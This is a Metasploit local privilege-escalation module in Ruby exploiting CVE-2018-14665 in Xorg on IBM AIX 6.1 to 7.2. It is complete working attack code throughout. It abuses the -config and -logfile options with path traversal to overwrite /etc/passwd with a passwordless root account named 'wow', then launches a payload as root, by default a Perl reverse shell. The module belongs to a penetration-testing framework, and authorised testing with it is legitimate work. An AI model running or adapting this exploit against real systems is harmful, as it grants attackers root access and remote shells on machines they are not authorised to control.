# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::File
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Xorg X11 Server Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q(
        WARNING: Successful execution of this module results in /etc/passwd being overwritten.

        This module is a port of the OpenBSD X11 Xorg exploit to run on AIX.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that can start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.

        This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1.
        Due to permission restrictions of the crontab in AIX, this module does not use cron,
        and instead overwrites /etc/passwd in order to create a new user with root privileges.
        All currently logged in users need to be included when /etc/passwd is overwritten,
        else AIX will throw &#039;Cannot get "LOGNAME" variable&#039; when attempting to change user.
        The Xorg &#039;-fp&#039; parameter used in the OpenBSD exploit does not work on AIX,
        and is replaced by &#039;-config&#039;, in conjuction with ANSI-C quotes to inject newlines when
        overwriting /etc/passwd.
      ),
      &#039;Author&#039;         =>
        [
          &#039;Narendra Shinde&#039;, # Discovery and original FreeBSD exploit
          &#039;Zack Flack <dzflack[at]gmail.com>&#039; # Metasploit module and original AIX exploit
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => &#039;Oct 25 2018&#039;,
      &#039;Notes&#039;         =>
        {
          &#039;SideEffects&#039; => [ CONFIG_CHANGES ]
        },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-14665&#039;],
          [&#039;URL&#039;, &#039;https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html&#039;],
          [&#039;URL&#039;, &#039;https://aix.software.ibm.com/aix/efixes/security/xorg_advisory3.asc&#039;],
          [&#039;URL&#039;, &#039;https://github.com/dzflack/exploits/blob/master/aix/aixxorg.pl&#039;],
          [&#039;EDB&#039;, &#039;45938&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => [ARCH_CMD],
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Payload&#039;        => {
        &#039;Compat&#039; => {
          &#039;PayloadType&#039;  => &#039;cmd&#039;,
          &#039;RequiredCmd&#039;  => &#039;perl&#039;
        }
      },
      &#039;DefaultOptions&#039; => {
        &#039;Payload&#039; => &#039;cmd/unix/reverse_perl&#039;
      },
      &#039;Targets&#039;        =>
        [
          [&#039;IBM AIX Version 6.1&#039;, {}],
          [&#039;IBM AIX Version 7.1&#039;, {}],
          [&#039;IBM AIX Version 7.2&#039;, {}]
        ],
      &#039;DefaultTarget&#039;  => 1))

    register_options(
      [
        OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
      ]
    )
  end

  def check
    xorg_path = cmd_exec(&#039;command -v Xorg&#039;)
    if !xorg_path.include?(&#039;Xorg&#039;)
      print_error(&#039;Could not find Xorg executable&#039;)
      return Exploit::CheckCode::Safe
    end

    ksh93_path = cmd_exec(&#039;command -v ksh93&#039;)
    if !ksh93_path.include?(&#039;ksh&#039;)
      print_error(&#039;Could not find Ksh93 executable&#039;)
      return Exploit::CheckCode::Safe
    end

    if !xorg_vulnerable?
      print_error(&#039;Xorg version is not vulnerable&#039;)
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Appears
  end

  def exploit
    status = check

    if status == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, &#039;&#039;)
    end

    if !writable?(datastore[&#039;WritableDir&#039;])
      fail_with(Failure::BadConfig, "#{datastore[&#039;WritableDir&#039;]} is not writable")
    end

    xorg_path = cmd_exec(&#039;command -v Xorg&#039;)
    ksh93_path = cmd_exec(&#039;command -v ksh93&#039;)

    xorg_payload = generate_xorg_payload(xorg_path, ksh93_path, datastore[&#039;WritableDir&#039;])
    xorg_script_path = "#{datastore[&#039;WritableDir&#039;]}/wow.ksh"
    upload_and_chmodx(xorg_script_path, xorg_payload)

    passwd_backup = "#{datastore[&#039;WritableDir&#039;]}/passwd.backup"
    print_status("Backing up /etc/passwd to #{passwd_backup}")
    cmd_exec("cp /etc/passwd #{passwd_backup}")
    register_file_for_cleanup(passwd_backup)

    print_status("Executing #{xorg_script_path}")
    cmd_exec(xorg_script_path)
    print_status(&#039;Checking if we are root&#039;)

    if root?
      shell_payload = %(#!#{ksh93_path}
#{payload.encoded}
)
      shell_script_path = "#{datastore[&#039;WritableDir&#039;]}/wowee.ksh"
      upload_and_chmodx(shell_script_path, shell_payload)

      print_status(&#039;Executing shell payload&#039;)
      cmd_exec("#{ksh93_path} -c \"echo #{shell_script_path} | su - wow &\"")

      print_status(&#039;Restoring original /etc/passwd&#039;)
      cmd_exec("su - wow -c \"cp #{passwd_backup} /etc/passwd\"")
    else
      fail_with(Failure::PayloadFailed, &#039;&#039;)
    end
  end

  def generate_xorg_payload(xorg_path, ksh93_path, writabledir)
    passwd_file = read_file(&#039;/etc/passwd&#039;)
    passwd_array = passwd_file.split("\n")

    print_status(&#039;Retrieving currently logged in users&#039;)
    users = cmd_exec(&#039;who | cut -d\&#039; \&#039; -f1 | sort | uniq&#039;)
    users << "\n"
    users_array = users.split("\n")

    logged_in_users = &#039;&#039;
    if !users_array.empty?
      users_array.each do |user|
        user << &#039;:&#039;
        passwd_array.each do |line|
          if line.index(user) == 0
            logged_in_users << &#039;\n&#039;
            logged_in_users << line
          end
        end
      end
    end

    passwd_data = "$&#039;#{logged_in_users}\\nwow::0:0::/:/usr/bin/ksh\\n#&#039;"

    subdir_count = writabledir.count(&#039;/&#039;)
    relative_passwd = &#039;../&#039; * subdir_count + &#039;../../etc/passwd&#039;

    return %(#!#{ksh93_path}
    #{xorg_path} -config #{passwd_data} -logfile #{relative_passwd} :1 > /dev/null 2>&1
)
  end

  def xorg_vulnerable?
    version = cmd_exec(&#039;lslpp -L | grep -i X11.base.rte | awk \&#039;{ print $2 }\&#039;&#039;)
    print_status("Xorg version is #{version}")
    semantic_version = Gem::Version.new(version)

    vulnerable_versions = [
      [&#039;6.1.9.0&#039;, &#039;6.1.9.100&#039;],
      [&#039;7.1.4.0&#039;, &#039;7.1.4.30&#039;],
      [&#039;7.1.5.0&#039;, &#039;7.1.5.31&#039;],
      [&#039;7.2.0.0&#039;, &#039;7.2.0.1&#039;],
      [&#039;7.2.1.0&#039;, &#039;7.2.1.0&#039;],
      [&#039;7.2.2.0&#039;, &#039;7.2.2.0&#039;],
      [&#039;7.2.3.0&#039;, &#039;7.2.3.15&#039;]
    ]

    vulnerable_versions.each do |version_pair|
      if semantic_version >= Gem::Version.new(version_pair[0]) &&
         semantic_version <= Gem::Version.new(version_pair[1])
        return true
      end
    end

    return false
  end

  def root?
    id_output = cmd_exec(&#039;su - wow -c "id"&#039;)

    if id_output.include?(&#039;euid=0&#039;) || id_output.include?(&#039;uid=0&#039;)
      print_good(&#039;Got root!&#039;)
      return true
    end

    print_error(&#039;Not root&#039;)
    false
  end

  def upload_and_chmodx(path, data)
    print_status("Writing to #{path}")
    rm_f(path)
    write_file(path, data)
    cmd_exec("chmod 0555 &#039;#{path}&#039;")

    register_file_for_cleanup(path)
  end
end

